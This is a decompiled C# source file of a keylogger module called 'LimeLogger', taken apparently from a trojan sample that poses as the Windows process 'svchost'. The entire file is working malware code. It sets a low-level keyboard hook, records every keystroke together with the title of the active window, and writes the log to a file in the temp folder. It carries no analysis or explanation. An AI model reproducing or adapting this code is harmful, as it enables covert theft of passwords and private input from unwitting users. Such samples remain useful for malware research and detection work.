// Decompiled with JetBrains decompiler
// Type: svchost.Other.LimeLogger
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace svchost.Other
{
  [StandardModule]
  [OptionText]
  internal sealed class LimeLogger
  {
    private static string s = new FileInfo(Application.ExecutablePath).Name;
    private static readonly string loggerPath = Path.GetTempPath() + "\\" + LimeLogger.s + ".txt";
    private static string CurrentActiveWindowTitle;
    public static Clock Clock = new Clock();
    private const int WM_KEYDOWN = 256;
    private static LimeLogger.LowLevelKeyboardProc _proc = new LimeLogger.LowLevelKeyboardProc(LimeLogger.HookCallback);
    private static IntPtr _hookID = IntPtr.Zero;
    private static int WHKEYBOARDLL = 13;

    public static object Start()
    {
      LimeLogger._hookID = LimeLogger.SetHook(LimeLogger._proc);
      Application.Run();
      return (object) true;
    }

    private static IntPtr SetHook(LimeLogger.LowLevelKeyboardProc proc)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
        return LimeLogger.SetWindowsHookEx(LimeLogger.WHKEYBOARDLL, proc, LimeLogger.GetModuleHandle(currentProcess.ProcessName), 0U);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
      if (nCode >= 0 && wParam == (IntPtr) 256)
      {
        int vkCode = Marshal.ReadInt32(lParam);
        bool flag1 = ((int) LimeLogger.GetKeyState(20) & (int) ushort.MaxValue) != 0;
        bool flag2 = ((int) LimeLogger.GetKeyState(160) & 32768) != 0 || ((int) LimeLogger.GetKeyState(161) & 32768) != 0;
        string str1 = LimeLogger.KeyboardLayout(checked ((uint) vkCode));
        string str2 = flag1 || flag2 ? str1.ToUpper() : str1.ToLower();
        if (vkCode >= 112 && vkCode <= 135)
        {
          str2 = "[" + Conversions.ToString(vkCode) + "]";
        }
        else
        {
          string Left = ((Keys) vkCode).ToString();
          if (Operators.CompareString(Left, "Space", true) == 0)
            str2 = "[SPACE]";
          else if (Operators.CompareString(Left, "Return", true) == 0)
            str2 = "[ENTER]";
          else if (Operators.CompareString(Left, "Escape", true) == 0)
            str2 = "[ESC]";
          else if (Operators.CompareString(Left, "LControlKey", true) == 0)
            str2 = "[CTRL]";
          else if (Operators.CompareString(Left, "RControlKey", true) == 0)
            str2 = "[CTRL]";
          else if (Operators.CompareString(Left, "RShiftKey", true) == 0)
            str2 = "[Shift]";
          else if (Operators.CompareString(Left, "LShiftKey", true) == 0)
            str2 = "[Shift]";
          else if (Operators.CompareString(Left, "Back", true) == 0)
            str2 = "[Back]";
          else if (Operators.CompareString(Left, "LWin", true) == 0)
            str2 = "[WIN]";
          else if (Operators.CompareString(Left, "Tab", true) == 0)
            str2 = "[Tab]";
          else if (Operators.CompareString(Left, "Capital", true) == 0)
            str2 = !flag1 ? "[CAPSLOCK: ON]" : "[CAPSLOCK: OFF]";
        }
        using (StreamWriter streamWriter = new StreamWriter(LimeLogger.loggerPath, true))
        {
          if (Operators.CompareString(LimeLogger.CurrentActiveWindowTitle, LimeLogger.GetActiveWindowTitle(), true) == 0)
          {
            streamWriter.Write(str2);
          }
          else
          {
            streamWriter.WriteLine(Environment.NewLine);
            streamWriter.WriteLine("### { " + LimeLogger.HM() + " - " + LimeLogger.GetActiveWindowTitle() + " } ###");
            streamWriter.Write(str2);
          }
        }
      }
      return LimeLogger.CallNextHookEx(LimeLogger._hookID, nCode, wParam, lParam);
    }

    private static string HM()
    {
      string str;
      try
      {
        str = LimeLogger.Clock.LocalTime.ToString("yy/MM/dd");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "??/??/??";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private static string KeyboardLayout(uint vkCode)
    {
      uint lpdwProcessId = 0;
      try
      {
        StringBuilder pwszBuff = new StringBuilder();
        byte[] lpKeyState = new byte[256];
        if (!LimeLogger.GetKeyboardState(lpKeyState))
          return "";
        uint wScanCode = LimeLogger.MapVirtualKey(vkCode, 0U);
        IntPtr keyboardLayout = LimeLogger.GetKeyboardLayout(LimeLogger.GetWindowThreadProcessId(LimeLogger.GetForegroundWindow(), out lpdwProcessId));
        LimeLogger.ToUnicodeEx(vkCode, wScanCode, lpKeyState, pwszBuff, 5, 0U, keyboardLayout);
        return pwszBuff.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return ((Keys) checked ((int) vkCode)).ToString();
    }

    private static string GetActiveWindowTitle()
    {
      uint lpdwProcessId = 0;
      string activeWindowTitle;
      try
      {
        int windowThreadProcessId = (int) LimeLogger.GetWindowThreadProcessId(LimeLogger.GetForegroundWindow(), out lpdwProcessId);
        Process processById = Process.GetProcessById(checked ((int) lpdwProcessId));
        string str = processById.MainWindowTitle;
        if (string.IsNullOrEmpty(str))
          str = processById.ProcessName;
        LimeLogger.CurrentActiveWindowTitle = str;
        activeWindowTitle = str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        activeWindowTitle = "???";
        ProjectData.ClearProjectError();
      }
      return activeWindowTitle;
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int idHook,
      LimeLogger.LowLevelKeyboardProc lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern short GetKeyState(int keyCode);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
      uint wVirtKey,
      uint wScanCode,
      byte[] lpKeyState,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pwszBuff,
      int cchBuff,
      uint wFlags,
      IntPtr dwhkl);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [OptionText]
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
